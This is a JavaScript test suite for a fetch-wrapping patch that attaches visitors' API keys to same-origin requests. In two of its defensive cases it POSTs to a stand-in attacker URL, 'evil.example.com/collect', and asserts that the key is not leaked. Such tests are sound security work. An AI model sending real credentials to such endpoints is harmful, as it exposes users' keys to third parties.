/* BYOK header injection on raw `fetch()` — eos.js.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * `EOS.api` / `EOS.apiSafe` have always attached the visitor's BYOK keys, but
 * the 2026-09-03 frontend audit (F2) measured 847 raw `fetch()` call sites
 * across 94 app pages, 24 of them in apps that call `self.think()`. A visitor
 * key could therefore never reach those AI endpoints — BYOK was dead on
 * exactly the apps that ship in the public distribution, which is the only
 * place BYOK is the intended mechanism.
 *
 * The fix patches the sink (`window.fetch`) rather than migrating 847 call
 * sites, because `EOS.api` throws on non-2xx and raw `fetch` does not: a
 * mechanical swap would have changed control flow everywhere.
 *
 * Patching a global sink to carry a credential is the kind of change that is
 * only safe if the same-origin rule actually holds, and that rule is invisible
 * in a browser — a cross-origin leak looks like a working page. So the
 * load-bearing case here is `does NOT leak cross-origin`; the rest guard the
 * ways a later "tidy-up" would silently disable it.
 *
 * Pure//load-time surface only — see shim.mjs.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { loadStatic } from "./shim.mjs";

/** Load eos.js with a fake key store and a spy standing in for native fetch. */
function makeEnv(keys = {}, extra = {}) {
  const store = new Map(
    Object.entries(keys).map(([provider, v]) => [`eos.byok.${provider}`, v]),
  );
  const calls = [];
  const ctx = loadStatic("emptyos/web/static/eos.js", {
    ...extra,
    localStorage: {
      getItem: (k) => (store.has(k) ? store.get(k) : null),
      setItem: (k, v) => store.set(k, String(v)),
      removeItem: (k) => store.delete(k),
    },
    // The spy must be in place BEFORE load: the patch captures whatever
    // window.fetch is at install time as its `_native`.
    fetch: (input, init) => {
      calls.push({ input, init });
      return Promise.resolve({
        ok: true,
        status: 200,
        json: async () => ({}),
        headers: { get: () => null },
      });
    },
    Headers: globalThis.Headers,
    Request: globalThis.Request,
    // eos.js schedules DOM auto-mount (nav, chips) on a timer. Those callbacks
    // are rendering, which shim.mjs explicitly does not model, so under
    // `node --test` they fire after the test ends and surface as an
    // uncaughtException that fails the FILE while every case passes. The patch
    // under test installs synchronously in a load-time IIFE, so nothing here
    // depends on a timer ever running.
    setTimeout: () => 0,
    setInterval: () => 0,
  });
  calls.length = 0; // discard eos.js's own load-time pings
  return { ctx, calls };
}

/** Read a header off whatever shape the patch handed the native fetch. */
function headerOf(call, name) {
  if (call.init && call.init.headers) return new Headers(call.init.headers).get(name);
  if (call.input && call.input.headers) return call.input.headers.get(name);
  return null;
}

/** Layer names as a HOST array.
 *
 * `EOS.fetchLayers()` builds its array inside the vm context, so its prototype
 * is the sandbox's Array.prototype. `assert/strict`'s deepEqual compares
 * prototypes and would fail on an otherwise-identical list. */
function layerNames(ctx) {
  return Array.from(ctx.EOS.fetchLayers());
}

const OPENAI = "X-User-OpenAI-Key";

test("eos.js loads far enough to expose the BYOK surface", () => {
  // Guards every case below: a truncated load would leave EOS.byok undefined
  // and the assertions would pass vacuously against `undefined`.
  const { ctx } = makeEnv();
  assert.equal(typeof ctx.EOS, "object", "EOS missing");
  assert.equal(typeof ctx.EOS.byok, "object", "EOS.byok missing");
  for (const fn of ["get", "set", "list", "sameOrigin"]) {
    assert.equal(typeof ctx.EOS.byok[fn], "function", `byok.${fn} missing`);
  }
});

test("BYOK installs as a named layer on the shared chain", () => {
  const { ctx } = makeEnv();
  assert.deepEqual(layerNames(ctx), ["byok"]);
});

test("registering the same layer name twice is a no-op", () => {
  // The chain's per-name idempotence replaces four different ad-hoc flags
  // (__eosByok, _eosFetchWrapped, _eosProvWrapped, and none at all).
  const { ctx } = makeEnv();
  assert.equal(ctx.EOS.wrapFetch("byok", () => {}), false, "duplicate name was accepted");
  assert.deepEqual(layerNames(ctx), ["byok"]);
});

test("layers run in registration order, outermost first", () => {
  const { ctx, calls } = makeEnv();
  const seen = [];
  ctx.EOS.wrapFetch("a", (i, n, next) => { seen.push("a"); return next(i, n); });
  ctx.EOS.wrapFetch("b", (i, n, next) => { seen.push("b"); return next(i, n); });
  ctx.fetch("/api/health");
  assert.deepEqual(seen, ["a", "b"]);
  assert.equal(calls.length, 1, "the chain must still reach the native fetch");
});

test("a layer queued BEFORE eos.js loads still lands, and lands after byok", () => {
  // The five pages that load eos-components.js first. eos.js drains
  // __eosFetchPending *after* registering its own layer, so the chain comes out
  // identical to the 239 pages that load eos.js first — which is the whole
  // point of the queue: order stops depending on <script> order.
  const early = (i, n, next) => next(i, n);
  const { ctx } = makeEnv({}, { __eosFetchPending: [["ai-offline-toast", early]] });
  assert.deepEqual(layerNames(ctx), ["byok", "ai-offline-toast"]);
});

test("a layer that does not delegate stops the request — and is nameable", () => {
  // Previously this failure mode was silent and untraceable; the chain at least
  // makes the culprit visible via EOS.fetchLayers().
  const { ctx, calls } = makeEnv();
  ctx.EOS.wrapFetch("blocker", () => Promise.resolve("blocked"));
  ctx.fetch("/api/health");
  assert.equal(calls.length, 0, "native fetch should not have been reached");
  assert.deepEqual(layerNames(ctx), ["byok", "blocker"]);
});

test("a same-origin request carries the visitor's key", () => {
  // The whole point: this is the path kb/boards/reader/ppt take today.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("/kb/api/digest-doc", { method: "POST" });
  assert.equal(calls.length, 1);
  assert.equal(headerOf(calls[0], OPENAI), "sk-test-123");
});

test("a CROSS-ORIGIN request does NOT — the security property", () => {
  // If this ever regresses, every page silently posts the visitor's API key to
  // a third party. It is the reason patching a global sink is acceptable at
  // all, and it cannot be observed by looking at a rendered page.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("https://evil.example.com/collect", { method: "POST" });
  assert.equal(calls.length, 1);
  assert.equal(headerOf(calls[0], OPENAI), null, "key leaked cross-origin");
});

test("an absolute same-origin URL is still recognised", () => {
  // location.href is http://localhost/ in the shim; a page that builds an
  // absolute URL must not lose BYOK just for spelling the origin out.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("http://localhost/kb/api/ask");
  assert.equal(headerOf(calls[0], OPENAI), "sk-test-123");
});

test("a header the caller already set is never overwritten", () => {
  // EOS.api's own _apiFetch lands in this patch too, so injection has to be
  // idempotent rather than clobbering what the wrapper already attached.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("/kb/api/ask", { headers: { [OPENAI]: "sk-caller-set" } });
  assert.equal(headerOf(calls[0], OPENAI), "sk-caller-set");
});

test("the caller's other headers and init survive injection", () => {
  // A patch that rebuilt init from scratch would silently drop Content-Type
  // and method — the request would still fire, and the server would 4xx.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("/kb/api/ask", {
    method: "POST",
    body: '{"q":1}',
    headers: { "Content-Type": "application/json" },
  });
  assert.equal(calls[0].init.method, "POST");
  assert.equal(calls[0].init.body, '{"q":1}');
  assert.equal(headerOf(calls[0], "Content-Type"), "application/json");
  assert.equal(headerOf(calls[0], OPENAI), "sk-test-123");
});

test("with no key stored the request is passed through untouched", () => {
  // The overwhelmingly common case (no BYOK configured). The patch must not
  // manufacture a headers object where the caller supplied none.
  const { ctx, calls } = makeEnv();
  ctx.fetch("/kb/api/ask");
  assert.equal(calls.length, 1);
  assert.equal(calls[0].init, undefined, "init was rewritten with no key to add");
});

test("a Request object is handled, not silently skipped", () => {
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch(new Request("http://localhost/kb/api/ask"));
  assert.equal(headerOf(calls[0], OPENAI), "sk-test-123");
});

test("a PROTOCOL-RELATIVE url to another host does not get the key", () => {
  // `//host/path` inherits the current scheme and reads like a relative path,
  // which is exactly why it is a classic leak vector — it is not relative at
  // all. Resolving against location.href is what catches it.
  const { ctx, calls } = makeEnv({ openai: "sk-test-123" });
  ctx.fetch("//evil.example.com/collect");
  assert.equal(headerOf(calls[0], OPENAI), null, "key leaked via protocol-relative URL");
});

test("an unparseable URL fails CLOSED rather than injecting", () => {
  // Failing open would mean a target we could not even parse still receives
  // the key. Note `null` is deliberately NOT asserted here: String(null) is
  // "null", which resolves to the same-origin path /null — injecting there is
  // correct, and an earlier draft of this test asserted otherwise from a wrong
  // mental model of what fetch(null) does.
  const { ctx } = makeEnv({ openai: "sk-test-123" });
  assert.equal(ctx.EOS.byok.sameOrigin("http://[bad"), false);
  assert.equal(ctx.EOS.byok.sameOrigin("/kb/api/x"), true, "relative must still pass");
});
